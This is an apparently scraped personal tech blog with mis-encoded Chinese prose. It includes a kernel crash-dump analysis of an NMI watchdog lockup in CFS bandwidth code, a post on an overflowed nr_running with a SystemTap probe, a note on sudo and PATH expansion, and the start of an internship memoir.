RAX: 0000000000000001 RBX: ffff88092b2ed200 RCX: 0000000000000001 RDX: 0000000000000001 RSI: ffff88092b2ed200 RDI: ffff880f6afb8600 RBP: ffff88103fbc3dd0 R8: ffff88103d2b7500 R9: 0000000000000001 R10: 0000000000000000 R11: 0000000000000000 R12: ffff880f6afb8600 R13: 0000000000000001 R14: 0000000000000003 R15: ffff8813bf7f5548 ORIG_RAX: ffffffffffffffff CS: 0010 SS: 0018--- &lt;NMI exception stack&gt; ---#12 [ffff88103fbc3db8] update_curr at ffffffff810ce3cf#13 [ffff88103fbc3dd8] enqueue_entity at ffffffff810d042d#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4#15 [ffff88103fbc3e58] distribute_cfs_runtime at ffffffff810d1932#16 [ffff88103fbc3ea0] sched_cfs_period_timer at ffffffff810d1acf#17 [ffff88103fbc3ed8] __hrtimer_run_queues at ffffffff810b4d72#18 [ffff88103fbc3f30] hrtimer_interrupt at ffffffff810b5310#19 [ffff88103fbc3f80] local_apic_timer_interrupt at ffffffff81051037#20 [ffff88103fbc3f98] smp_apic_timer_interrupt at ffffffff81699f0f#21 [ffff88103fbc3fb0] apic_timer_interrupt at ffffffff8169845d--- &lt;IRQ stack&gt; ---#22 [ffff8801699a3de8] apic_timer_interrupt at ffffffff8169845d [exception RIP: native_safe_halt+6] RIP: ffffffff81060fe6 RSP: ffff8801699a3e98 RFLAGS: 00000286 RAX: 00000000ffffffed RBX: ffff88103fbcd080 RCX: 0100000000000000 RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000046 RBP: ffff8801699a3e98 R8: 0000000000000000 R9: 0000000000000000 R10: 0000000000000000 R11: 0000000000000000 R12: 00099b9bb0645f00 R13: ffff88103fbcfde0 R14: f21bf8c4662d3c34 R15: 0000000000000082 ORIG_RAX: ffffffffffffff10 CS: 0010 SS: 0018#23 [ffff8801699a3ea0] default_idle at ffffffff810347ff#24 [ffff8801699a3ec0] arch_cpu_idle at ffffffff81035146#25 [ffff8801699a3ed0] cpu_startup_entry at ffffffff810e82f5#26 [ffff8801699a3f28] start_secondary at ffffffff8104f0da çœ‹ bt çš„é•¿ç›¸ï¼Œæ¨æ–­ç³»ç»Ÿæ­»äº¡ä¹‹å‰åº”è¯¥æ²¡å•¥äº‹æƒ…ï¼Œç„¶åå¼€å§‹å¤„ç†ä¸€ä¸ªæ—¶é’Ÿä¸­æ–­ï¼Œæ­£åœ¨å¤„ç†æ—¶é’Ÿä¸­æ–­çš„è¿‡ç¨‹ä¸­å‘ç”Ÿä¸€ä¸ª NMI å¼‚å¸¸ï¼Œç„¶åè¿›å…¥å¼‚å¸¸å¤„ç†ï¼Œç„¶ååœ¨å¼‚å¸¸å¤„ç†é‡Œ panic äº†ã€‚åœ¨å¼‚å¸¸æ ˆä¸­é€‰æ‹©å¤šçœ‹äº†ä¸¤çœ¼çš„å‡½æ•°æ˜¯ watchdog_overflow_callbackï¼Œæ˜¯å› ä¸ºåé¢çš„æ‰“å°ä¿¡æ¯å’Œ panic æ“ä½œéƒ½åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢è¿›è¡Œçš„ï¼Œå…³äº watchdog_overflow_callback è¿™ä¸ªå‡½æ•°æè¿°^watchdogï¼š This function is invoked from Non-Maskable Interrupt (NMI) context. If a CPU is busy, this function executes periodically and it checks whether watchdog_timer_fn has incremented the CPU-specific counter during the past interval. If the counter has not been incremented, watchdog_overflow_callback assumes that the CPU is â€˜locked upâ€™ in a section of kernel code where interrupts are disabled, and a panic occurs unless â€˜panic on hard lockupâ€™ is explicitly disabled via the nmi_watchdog&#x3D;nopanic parameter on the kernel command line. åˆ†æ watchdog_overflow_callback å‡½æ•°çš„å®ç°ï¼Œå…¶ä¸­ is_hardlockup åé¢å¯¹åº”çš„ä»£ç å—ä¸­å…·ä½“æ˜¯å¯¹æ¯”å¦‚ä¸‹çš„ä¸¤ä¸ªå€¼ï¼š 1234crash&gt; px hrtimer_interrupts_saved:7per_cpu(hrtimer_interrupts_saved, 7) = $14 = 0xa50fbcrash&gt; px hrtimer_interrupts:7per_cpu(hrtimer_interrupts, 7) = $15 = 0xa50fb å…¶ä¸­ hrtimer_interrupts æ˜¯ pre-cpu å˜é‡ï¼Œå®ƒä¼šè¢« call_timer_fn æ›´æ–° (æ ¹æ®å¤–éƒ¨ä¿¡æ¯)ï¼Œä¹Ÿå°±æ˜¯è¯´ watchdog å‘ç° cpu #7 locked up åœ¨ä¸€å—å†…æ ¸ä»£ç é‡Œäº†ã€‚å›å¤´æ³¨æ„çœ‹ä¸€ä¸‹ bt æ³¨æ„å…¶ä¸­ä¸¤æ¬¡ RFLAGS çš„å˜åŒ–ï¼Œåœ¨ä¸­æ–­æ ˆä¹‹å‰ 00000286 æ˜¯å³ IF æ ‡å¿—ä½ç½®ä½ï¼Œè¿›å…¥å¼‚å¸¸æ ˆè¿‡åå‘ç° 00000002 å³ IF æœªç½®ä½ï¼Œä¸€ä¸ªå…¸å‹ä¸­æ–­è¢« NMI æŠ¢å çš„ç°è±¡ï¼Œè¿™ç°è±¡å¯èƒ½æ˜¯ ISR å ç”¨äº†å¤ªä¹…äº†è§¦å‘äº† watchdogã€‚ IRQ stack å¦‚ä¸‹ï¼š 1234567891011121314151617181920 [exception RIP: update_curr+15] RIP: ffffffff810ce3cf RSP: ffff88103fbc3db8 RFLAGS: 00000002 RAX: 0000000000000001 RBX: ffff88092b2ed200 RCX: 0000000000000001 RDX: 0000000000000001 RSI: ffff88092b2ed200 RDI: ffff880f6afb8600 RBP: ffff88103fbc3dd0 R8: ffff88103d2b7500 R9: 0000000000000001 R10: 0000000000000000 R11: 0000000000000000 R12: ffff880f6afb8600 R13: 0000000000000001 R14: 0000000000000003 R15: ffff8813bf7f5548 ORIG_RAX: ffffffffffffffff CS: 0010 SS: 0018--- &lt;NMI exception stack&gt; ---#12 [ffff88103fbc3db8] update_curr at ffffffff810ce3cf#13 [ffff88103fbc3dd8] enqueue_entity at ffffffff810d042d#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4#15 [ffff88103fbc3e58] distribute_cfs_runtime at ffffffff810d1932#16 [ffff88103fbc3ea0] sched_cfs_period_timer at ffffffff810d1acf#17 [ffff88103fbc3ed8] __hrtimer_run_queues at ffffffff810b4d72#18 [ffff88103fbc3f30] hrtimer_interrupt at ffffffff810b5310#19 [ffff88103fbc3f80] local_apic_timer_interrupt at ffffffff81051037#20 [ffff88103fbc3f98] smp_apic_timer_interrupt at ffffffff81699f0f#21 [ffff88103fbc3fb0] apic_timer_interrupt at ffffffff8169845d--- &lt;IRQ stack&gt; --- å·²çŸ¥ apic_timer_interrupt ä¼šç¦ç”¨ä¸­æ–­ï¼Œè€Œä¸”åœ¨ hrtimer_interrupt å‡½æ•°æ³¨é‡Šä¹Ÿé‡å¤è¯´æ˜äº†è¿™ä¸€ç‚¹ï¼Œå°±åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¼ºåŒ–äº†ä¹‹å‰çŒœæƒ³ ISRï¼ˆapic_timer_interruptï¼‰è§¦å‘ NMI watchdog çš„æƒ³æ³•ã€‚ 1234567891011crash&gt; dis -s hrtimer_interrupt|head -n 10FILE: kernel/hrtimer.cLINE: 1292 1287\t/* 1288 * High resolution timer interrupt 1289 * Called with interrupts disabled 1290 */ 1291\tvoid hrtimer_interrupt(struct clock_event_device *dev)* 1292\t&#123; 1293 struct hrtimer_cpu_base *cpu_base = this_cpu_ptr(&amp;hrtimer_bases); é€šè¿‡ backtrace æ¢³ç†å‡½æ•°çš„è°ƒç”¨å…³ç³» update_curr&lt;-enqueue_entity&lt;-unthrottle_cfs_rq&lt;-distribute_cfs_runtime&lt;-sched_cfs_period_timerçŒœæµ‹è¿™ä¸ªå¯èƒ½ä¸ CFS Bandwidth Control [^cfs_bandwidth] ç‰¹æ€§æœ‰ç‚¹å…³ç³» (é€šè¿‡ dis -s unthrottle_cfs_rq ç¡®è®¤)ï¼Œä¸‹é¢å°±æ˜¯åˆ©åŸºäº x86_64 ä¸Š caller ä¸ callee çº¦å®šä»¥åŠå‡½æ•°åŸå‹çœ‹å‚æ•°ï¼Œå»å‚æ•°çš„å€¼å¯¹æ¯”ã€‚ ç¬¬ä¸€ç»„ï¼šdistribute_cfs_runtime å‡½æ•°åŸå‹ï¼š 123crash&gt; dis -s distribute_cfs_runtime 3423 static u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b, 3424 u64 remaining, u64 expires) caller: 1#16 [ffff88103fbc3ea0] sched_cfs_period_timer at ffffffff810d1acf 123456crash&gt; dis 0xffffffff810d1acf -r |tail...0xffffffff810d1ac1 &lt;sched_cfs_period_timer+193&gt;:\tmov %r13,%rsi0xffffffff810d1ac4 &lt;sched_cfs_period_timer+196&gt;:\tmov %r15,%rdx0xffffffff810d1ac7 &lt;sched_cfs_period_timer+199&gt;:\tmov %r12,%rdi0xffffffff810d1aca &lt;sched_cfs_period_timer+202&gt;:\tcallq 0xffffffff810d1840 &lt;distribute_cfs_runtime&gt; callee: 123456789101112crash&gt; dis distribute_cfs_runtime|head -n 200xffffffff810d1840 &lt;distribute_cfs_runtime&gt;:\tnopl 0x0(%rax,%rax,1) [FTRACE NOP]0xffffffff810d1845 &lt;distribute_cfs_runtime+5&gt;:\tpush %rbp0xffffffff810d1846 &lt;distribute_cfs_runtime+6&gt;:\tmov %rsp,%rbp0xffffffff810d1849 &lt;distribute_cfs_runtime+9&gt;:\tpush %r15 // 3rd0xffffffff810d184b &lt;distribute_cfs_runtime+11&gt;:\tpush %r140xffffffff810d184d &lt;distribute_cfs_runtime+13&gt;:\tmov %rdx,%r140xffffffff810d1850 &lt;distribute_cfs_runtime+16&gt;:\tpush %r13 // 2nd0xffffffff810d1852 &lt;distribute_cfs_runtime+18&gt;:\tpush %r12 // 1st0xffffffff810d1854 &lt;distribute_cfs_runtime+20&gt;:\tmov %rsi,%r120xffffffff810d1857 &lt;distribute_cfs_runtime+23&gt;:\tpush %rbx0xffffffff810d1858 &lt;distribute_cfs_runtime+24&gt;:\tsub $0x10,%rsp 12345678crash&gt; bt -f...#15 [ffff88103fbc3e58] distribute_cfs_runtime at ffffffff810d1932 ffff88103fbc3e60: ffff88103d2b7500 f21bf8c4662d3c34 ffff88103fbc3e70: ffff8813bf7f5580 ffff8813bf7f5548 ffff88103fbc3e80: 0000000002625a00 ffff8813bf7f5640 ffff88103fbc3e90: 00099ba6210dc705 ffff88103fbc3ed0 ffff88103fbc3ea0: ffffffff810d1acf æ ¹æ®æ ˆé¡ºåºï¼šcfs_bandwidth *cfs_b æ˜¯ ffff8813bf7f5548,u64 remaining æ˜¯ 0000000002625a00,u64 expires æ˜¯ 00099ba6210dc705ã€‚ ç¬¬äºŒç»„æ•° unthrottle_cfs_rq å‡½æ•° åŸå‹ï¼šunthrottle_cfs_rq(struct cfs_rq *cfs_rq) caller: 1234crash&gt; dis -r ffffffff810d1932 | tail...0xffffffff810d192a &lt;distribute_cfs_runtime+234&gt;:\tmov %r15,%rdi0xffffffff810d192d &lt;distribute_cfs_runtime+237&gt;:\tcallq 0xffffffff810d1610 &lt;unthrottle_cfs_rq&gt; callee: 12345crash&gt; dis -r ffffffff810d16f4 | head -n 200xffffffff810d1610 &lt;unthrottle_cfs_rq&gt;:\tnopl 0x0(%rax,%rax,1) [FTRACE NOP]0xffffffff810d1615 &lt;unthrottle_cfs_rq+5&gt;:\tpush %rbp0xffffffff810d1616 &lt;unthrottle_cfs_rq+6&gt;:\tmov %rsp,%rbp0xffffffff810d1619 &lt;unthrottle_cfs_rq+9&gt;:\tpush %r15 12345#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4 ffff88103fbc3e28: ffff88103fe56c40 00000000008cc0b3 ffff88103fbc3e38: ffff8813bf7f5640 00099ba6210dc705 ffff88103fbc3e48: ffff88103d2b7400 ffff88103fbc3e98 ffff88103fbc3e58: ffffffff810d1932 åˆ™ struct cfs_rq *cfs_rq æ˜¯ ffff88103d2b7400 æŸ¥çœ‹ç»“æ„ä½“å­—æ®µçš„å€¼ï¼š 123crash&gt; cfs_rq.runtime_remaining,runtime_expires ffff88103d2b7400 runtime_remaining = 1 runtime_expires = 2704412611823365 è·å– cfs_rq.throttled_list é“¾è¡¨çš„åœ°å€ï¼š 1234crash&gt; cfs_rq.throttled_list ffff88103d2b7400 -oxstruct cfs_rq &#123; [ffff88103d2b7500] struct list_head throttled_list;&#125; ç¡®è®¤ rq çš„å‰©ä½™è¿è¡Œæ—¶é—´æ€»é‡ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970crash&gt; list -H ffff88103d2b7500 -o cfs_rq.throttled_list -s cfs_rq.runtime_remaining | grep -c runtime_remaining22crash&gt; list -H ffff88103d2b7500 -o cfs_rq.throttled_list -s cfs_rq.throttled,runtime_remainingffff88103d2b6200 throttled = 1 runtime_remaining = -2535ffff88103d2b6800 throttled = 1 runtime_remaining = -2337ffff88103d2b7e00 throttled = 1 runtime_remaining = -2706ffff880f30f33e00 throttled = 1 runtime_remaining = -2441ffff88103d2b5600 throttled = 1 runtime_remaining = -2356ffff88103d2b6a00 throttled = 1 runtime_remaining = -2365ffff88103d2b7a00 throttled = 1 runtime_remaining = -2260ffff88103d2b5400 throttled = 1 runtime_remaining = -2404ffff88103d2b6c00 throttled = 1 runtime_remaining = -2421ffff88103d2b7600 throttled = 1 runtime_remaining = -2429ffff88103d2b4200 throttled = 1 runtime_remaining = -2357ffff88103d2b7800 throttled = 1 runtime_remaining = -2359ffff88103d2b6000 throttled = 1 runtime_remaining = -2416ffff88103d2b7200 throttled = 1 runtime_remaining = -2353ffff88103d2b6e00 throttled = 1 runtime_remaining = -2263ffff8813be33a800 throttled = 1 runtime_remaining = -3394ffff880f30f33c00 throttled = 1 runtime_remaining = -2599ffff880f30f31000 throttled = 1 runtime_remaining = -2546ffff8813be33ae00 throttled = 1 runtime_remaining = -3157ffff88103d2b4c00 throttled = 1 runtime_remaining = -2337ffff88103d2b6600 throttled = 1 runtime_remaining = -2284ffff8813bf7f5540 throttled = 1767994478 runtime_remaining = 0 çœ‹åˆ°ä¸€ç»„å¼‚å¸¸çš„å€¼æ˜æ˜¾å’Œä¸Šé¢çš„ cfs_rq çš„ä¸ä¸€æ ·ã€‚ 123crash&gt; struct cfs_rq.throttled,runtime_remaining ffff8813bf7f5540 throttled = 1767994478 runtime_remaining = 0 æ„Ÿè°¢ wuzhouhui çš„æŒ‡æ­£ ffff8813bf7f5540 æ˜¯ä¸€ä¸ª cfs_bandwidth ç»“æ„ä½“ï¼Œæ‰€ä»¥å€¼çœ‹ä¸Šå»éå¸¸è¯¡å¼‚ã€‚ ç´¯åŠ  remaining çš„å€¼è®¡ç®—ä¸€å…±å¤šå°‘æ—¶é—´ã€‚ 12crash&gt; pd 2535+2337+2706+2441+2356+2365+2260+2404+2421+2429+2357+2359+2416+2353+2263+3394+2599+2546+3157+2337+2284+0$2 = 52319 å¦‚æ³•ç‚®åˆ¶ï¼Œæ¥å–å¾— static u64 distribute_cfs_runtime(struct cfs_bandwidth *cfs_b, u64 remaining, u64 expires) ä¸­ remaining å‚æ•°ç»è¿‡å¤„ç†è¿‡åçš„å€¼ï¼š 1234567891011121314151617/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34380xffffffff810d190e &lt;distribute_cfs_runtime+206&gt;: sub %rcx,%rdx0xffffffff810d1911 &lt;distribute_cfs_runtime+209&gt;: cmp %rdx,%r120xffffffff810d1914 &lt;distribute_cfs_runtime+212&gt;: cmovbe %r12,%rdx/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34410xffffffff810d1918 &lt;distribute_cfs_runtime+216&gt;: sub %rdx,%r12/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34430xffffffff810d191b &lt;distribute_cfs_runtime+219&gt;: add %rcx,%rdx/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34470xffffffff810d191e &lt;distribute_cfs_runtime+222&gt;: test %rdx,%rdx/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34430xffffffff810d1921 &lt;distribute_cfs_runtime+225&gt;: mov %rdx,0xd8(%r15)/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34470xffffffff810d1928 &lt;distribute_cfs_runtime+232&gt;: jle 0xffffffff810d18bf &lt;distribute_cfs_runtime+127&gt;/usr/src/debug/kernel-3.10.0-514.26.2.el7/linux-3.10.0-514.26.2.el7.x86_64/kernel/sched/fair.c: 34480xffffffff810d192a &lt;distribute_cfs_runtime+234&gt;: mov %r15,%rdi0xffffffff810d192d &lt;distribute_cfs_runtime+237&gt;: callq 0xffffffff810d1610 &lt;unthrottle_cfs_rq&gt; 123456789101112crash&gt; l 343834333434 raw_spin_lock(&amp;rq-&gt;lock);3435 if (!cfs_rq_throttled(cfs_rq))3436 goto next;34373438 runtime = -cfs_rq-&gt;runtime_remaining + 1;3439 if (runtime &gt; remaining)3440 runtime = remaining;3441 remaining -= runtime;34423443 cfs_rq-&gt;runtime_remaining += runtime; å¯ä»¥çœ‹åˆ° remaining çš„å€¼æ”¾åœ¨ r12 é‡Œé¢ï¼Œä¸”ä¸‹é¢çš„æ±‡ç¼–æŒ‡ä»¤éƒ½æ²¡æœ‰ä¿®æ”¹ r12ï¼Œå°±è°ƒç”¨äº† unthrottle_cfs_rqã€‚ 12345678crash&gt; dis unthrottle_cfs_rq0xffffffff810d1610 &lt;unthrottle_cfs_rq&gt;: nopl 0x0(%rax,%rax,1) [FTRACE NOP]0xffffffff810d1615 &lt;unthrottle_cfs_rq+5&gt;: push %rbp0xffffffff810d1616 &lt;unthrottle_cfs_rq+6&gt;: mov %rsp,%rbp0xffffffff810d1619 &lt;unthrottle_cfs_rq+9&gt;: push %r150xffffffff810d161b &lt;unthrottle_cfs_rq+11&gt;: push %r140xffffffff810d161d &lt;unthrottle_cfs_rq+13&gt;: push %r130xffffffff810d161f &lt;unthrottle_cfs_rq+15&gt;: push %r12 12345678#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4 ffff88103fbc3e28: ffff88103fe56c40 00000000008cc0b3 // r12 ffff88103fbc3e38: ffff8813bf7f5640 00099ba6210dc705 ffff88103fbc3e48: ffff88103d2b7400 ffff88103fbc3e98 // r15 | rbp ffff88103fbc3e58: ffffffff810d1932crash&gt; pd 0x00000000008cc0b3$3 = 9224371 åœ¨ unthrottle_cfs_rq ä¸­å–å¾— distribute_cfs_runtime çš„ remaining çš„å€¼ä¸º 9224371ã€‚ 12345678crash&gt; cfs_bandwidth.throttled_cfs_rq ffff8813bf7f5548 throttled_cfs_rq = &#123; next = 0xffff88103d2b6300, prev = 0xffff88103d2b6700 &#125;crash&gt; list 0xffff88103d2b6300 | wc -l22 ä¹‹å‰è®¡ç®—åœ¨åœ°å€ä¸º ffff88103d2b7400 çš„ cfs_rq ä¸­çš„ runtime_remaining çš„å€¼ä¸º 52319ã€‚distribute_cfs_runtime ä¸­çš„æœ¬åœ°å˜é‡çš„ remaining ä¸º 9224371 è¿œå¤§äº cfs_rq ä¸­çš„ remaining ä¸º 52319ï¼Œè¿™å°±æ˜¯ä½¿å¾— kernel åœ¨ä¸‹é¢ while çš„å¾ªç¯ä¸­å‡ºä¸æ¥ï¼š 1234567891011121314151617181920212223242526272829303132333435crash&gt; l do_sched_cfs_period_timer3471...35133514 /*3515 * This check is repeated as we are holding onto the new bandwidth3516 * while we unthrottle. This can potentially race with an unthrottled3517 * group trying to acquire new bandwidth from the global pool.3518 */3519 while (throttled &amp;&amp; runtime &gt; 0) &#123;3520 raw_spin_unlock(&amp;cfs_b-&gt;lock);3521 /* we can&#x27;t nest cfs_b-&gt;lock while distributing bandwidth */3522 runtime = distribute_cfs_runtime(cfs_b, runtime,3523 runtime_expires);3524 raw_spin_lock(&amp;cfs_b-&gt;lock);35253526 throttled = !list_empty(&amp;cfs_b-&gt;throttled_cfs_rq);3527 &#125;35283529 /* return (any) remaining runtime */3530 cfs_b-&gt;runtime = runtime;3531 /*3532 * While we are ensured activity in the period following an3533 * unthrottle, this also covers the case in which the new bandwidth is3534 * insufficient to cover the existing bandwidth deficit. (Forcing the3535 * timer to remain active while there are any throttled entities.)3536 */3537 cfs_b-&gt;idle = 0;35383539 return 0;35403541 out_deactivate:3542 cfs_b-&gt;timer_active = 0;3543 return 1;3544 &#125; refereceï¼š [^cfs_bandwidth]: CFS Bandwidth Control","tags":["linux"]},{"title":"a question which about load_avg","path":"/2017/08/25/about-load_avg-and-nr_running/","content":"å†™è¿™ä¸ªè¿™ä¸ª post çš„åŸå› æˆ‘ä»¬ä¹‹å‰çš„çº¿ä¸Šä¸»æœº (3.10.0-229.el7) çš„ load éå¸¸éå¸¸è¯¡å¼‚é«˜è¾¾4294967293.49, 4294967293.43, 4294967259.67,ä¼—æ‰€å‘¨çŸ¥ Linux ä¸‹å½±å“ load çš„ä¸¤ä¸ªé‡è¦æŒ‡æ ‡æ˜¯running queue çš„å¤§å°ï¼Œå’Œ ä¸å¯ä¸­æ–­ç¡çœ ã€‚ ç„¶åçœ‹äº†ä¸€ä¸‹ ps æ²¡æœ‰ D çŠ¶æ€çš„è¿›ç¨‹ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ç³»ç»Ÿ rq éå¸¸éå¸¸å¤§ï¼Œvmstatä¸€çœ‹æœç„¶å¦‚æ­¤ï¼Œç„¶åè¿›å…¥ç³»ç»Ÿçš„è°ƒåº¦å™¨çš„ debug ä¿¡æ¯ä¸€çœ‹ï¼Œå‘ç°ä¸€ä¸ª cpu ä¸Šçš„ nr_running è¿‡äºå¤¸å¼ ã€‚ 123456789101112$ cat /proc/sched_debug | grep cpu#2 -A 10cpu#2, 2599.996 MHz .nr_running : 4294967293 .load : 0 .nr_switches : 31613974 .nr_load_updates : 125150154 .nr_uninterruptible : -480 .next_balance : 4462.218862 .curr-&gt;pid : 0 .clock : 167551354.006710 .cpu_load[0] : 0 .cpu_load[1] : 0 åˆ¤æ–­æ•°å€¼éå¸¸å¯èƒ½æ˜¯æŸä¸ªè·¯å¾„å¯¼è‡´äº†æº¢å‡ºã€‚ 123$ipythonIn [2]: hex(4294967293)Out[2]: &#x27;0xfffffffd&#x27; é—®é¢˜åœ¨é‡å¯åæš‚æ—¶æ¶ˆå¤±äº†ï¼Œç›®å‰æ²¡å¤ç°ï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰æ‰¾åˆ° root causeï¼Œåœ¨ä¸€ç•ªå°è¯•ä¸‹ä¸ä»…æ²¡æœ‰è§£å†³é—®é¢˜è¿˜äº§ç”Ÿäº†æ–°çš„ç–‘æƒ‘å¦‚ä¸‹ï¼š 123456789101112#!/usr/bin/env stapglobal traced_cpu;probe begin &#123; traced_cpu = $1 printf(&quot;Tracing CPU%d... &quot;, traced_cpu);&#125;probe kernel.function(&quot;inc_nr_running&quot;) &#123; if(cpu() != traced_cpu) next; printf(&quot;current is inc_nr and nr is %d &quot;, @var(&quot;rq&quot;)-&gt;nr_running);&#125; è´Ÿè´£äº§ç”Ÿ load è§¦å‘ enqueue æ“ä½œçš„ä»£ç ã€‚ 12345678int main()&#123;int var = 0;while(1)&#123;var = 1+1 ;&#125;return 0;&#125; æˆ‘å¼€äº† tmuxï¼Œåœ¨å¦ä¸€ä¸ªçª—å£è¿è¡Œå¦‚ä¸‹ä»£ç ï¼Œç„¶ååˆ‡å¥½æ¢å›äº§ç”Ÿ enqueue çš„ä»£ç ï¼Œåå¤è¿è¡Œã€‚ 1# stap -v 1.stp 6 åœ¨å¦ä¸€ä¸ª terminal é‡Œé¢è§‚å¯Ÿ nr_running æœ‰æ—¶å€™ä¼šå˜æˆ 0ã€‚ 123456789101112131415current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 10current is inc_nr and nr is 0current is inc_nr and nr is 10current is inc_nr and nr is 0current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9current is inc_nr and nr is 9 ç­‰å“ªå¤©æœ‰æ—¶é—´å†è¿½æ€ï¼Œæˆ–è€…å“ªä¸ªå¤§ä½¬çŸ¥é“åŸå› å¸®å¿™è®²ä¸€ä¸‹ï¼Œæ‹œè°¢ï¼","tags":["linux"]},{"title":"bash common sense issues","path":"/2017/07/12/bash-trap/","content":"ä»Šå¤©é‡åˆ°ä¸€ä¸ªç»éªŒä¸Šçš„ä¸€ä¸ªé™·é˜±ï¼Œè›®æœ‰æ„æ€çš„ã€‚å°ä¼™ä¼´é—®æˆ‘ä¸ºä»€ä¹ˆ sudo å‰åçš„ pip ä½ç½®ä¸ä¸€æ ·ï¼Ÿ 12345678[guohao@localhost ~]$ sudo type pippip is /bin/pip[guohao@localhost ~]$ type pippip is /usr/bin/pip[guohao@localhost ~]$ echo $PATH/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/guohao/.local/bin:/home/guohao/bin[guohao@localhost ~]$ sudo echo $PATH/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/guohao/.local/bin:/home/guohao/bin ç»éªŒä¹‹è°ˆå°±æ˜¯ sudo ä½¿ç”¨äº† root çš„ PATH ç¯å¢ƒå˜é‡ï¼Œç„¶å echo ä¸€ä¸‹ path å˜é‡å®Œå…¨ä¸€è‡´ã€‚ case 1: 123456[guohao@localhost ~]$ sudo bash[root@localhost guohao]# type pippip is /bin/pip[root@localhost guohao]# exit[guohao@localhost ~]$ type pippip is /usr/bin/pip å‘ç° case 1 ä¸ä¹‹å‰çš„æ˜¾ç¤ºç»“æœä¸€è‡´ï¼Œtype ç¬¦åˆé¢„æœŸè¡Œä¸ºï¼Œä»ç¬¬ä¸€ä¸ª PATH ä¸­æ‰“å° pip çš„ä½ç½®ã€‚è¿™å°±å¾ˆå¥‡æ€ªäº†ï¼Œä¸ºä»€ä¹ˆåˆ‡æ¢åˆ° shell é‡Œé¢å»å’Œåœ¨å¤–é¢çš„å€¼ä¸ä¸€è‡´å‘¢ï¼Ÿ case2: 1234[guohao@localhost ~]$ echo &#x27;echo $PATH&#x27; | sh/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/guohao/.local/bin:/home/guohao/bin[guohao@localhost ~]$ echo &#x27;echo $PATH&#x27; | sudo sh/sbin:/bin:/usr/sbin:/usr/bin è¯¡å¼‚äº†åªæœ‰ echo ä¸ä¸€æ ·ï¼éš¾é“æ˜¯ sudo çš„ç‰¹åˆ«å¤æ‚çš„ç‰¹æ€§ï¼Œç„¶å strace ä¸€ä¸‹å‘ç°æ˜¯ bash çš„å¯¼è‡´æˆ‘çŠ¯äº†ä¸€ä¸ªæ€ç»´å®šåŠ¿çš„é”™è¯¯ã€‚ 12[guohao@localhost ~]$ strace sudo echo &quot;$PATH&quot;execve(&quot;/usr/bin/sudo&quot;, [&quot;sudo&quot;, &quot;echo&quot;, &quot;/usr/local/bin:/usr/bin:/usr/loc&quot;...], 0x7ffcccc6e8f0 /* 17 vars */) = 0 é¡ºä¾¿èµæ‰¬ä¸€ä¸‹straceçš„ä¾¿åˆ©ä¸å¼ºå¤§ã€‚","tags":["tips"]},{"title":"remote internship in flintos","path":"/2017/06/20/remote-intership-on-flintos/","content":"ä»¥ä¸ºè‡ªä¸Šæ¬¡ç¦»å¼€åŒ—äº¬å°±ä¸ä¼šåœ¨æ¥åŒ—äº¬çš„å·¥ä½œçš„ï¼Œä½†æ˜¯äº‹å®ä¸ŠåŒ—äº¬çš„å·¥ä½œæœºä¼šæ¯”å…¶ä»–åŸå¸‚å¤šå¤ªå¤šã€‚ 0x00 å†è®¿äº¬åŸå‡†å¤‡å…¥èŒè¿™æ¬¡æ¥åŒ—äº¬ä¸åŒäºä¸Šä¸€æ¬¡çš„å¿ƒå¢ƒï¼Œå¯èƒ½æ˜¯ç»å†å¤šäº†ä¸€ç‚¹ã€‚ ç†Ÿæ‚‰é¡¹ç›®æœ¬èº«èŠ±äº†ä¸€å‘¨å·¥ä½œæ—¥ï¼Œè¿™æ—¶å€™ä¸å¾—ä¸æ„Ÿå¹ä¼˜ç§€çš„é¡¹ç›®ç®¡ç†å¯ä»¥å¸®æ–°äººå…¥æ‰‹èŠ‚çº¦å¤§é‡æ—¶é—´ï¼Œä¸è¿‡å› ä¸ºå®¢è§‚æ¡ä»¶é™åˆ¶å¾ˆå¤šæ—¶é—´åœ¨ç­‰å¾…ç¼–è¯‘ï¼Œè¿™ä¸ªæœŸé—´ä¸»è¦çœ‹æ–‡æ¡£å’Œé’¢ä¹‹ç‚¼é‡‘æœ¯å¸ˆï¼Œè¿˜æœ‰å’Œè€æ¿èŠå¤©ã€‚ working-with-flintos å½“æ—¶åŒ—äº¬åŠå…¬å®¤å¸¸é©» 3 äººï¼Œä¸€ä¸ªå…¨æ ˆï¼Œè€æ¿å’Œåˆä¼™äººï¼Œåœ¨å·¥ä½œæœŸé—´ carrie(ä¸€ä¸ªç¾ä¸½çš„å°å§å§) 